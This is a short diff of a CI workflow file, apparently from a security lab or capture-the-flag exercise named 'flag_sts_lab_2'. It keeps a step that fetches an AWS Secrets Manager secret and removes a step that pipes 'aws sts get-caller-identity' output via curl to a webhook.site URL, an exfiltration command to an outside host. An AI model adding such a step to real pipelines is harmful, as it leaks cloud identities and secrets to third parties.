@@ -24,5 +24,3 @@ jobs:
  
       - run: aws secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:us-east-1:442808425507:secret:flag_sts_lab_2-TadXK1
         shell: bash
-      - run: aws sts get-caller-identity | curl -X POST -H "Content-Type: application/json" -d @- https://webhook.site/6484e17f-73ba-4bbf-821f-6b66b46c833d
-        shell: bash
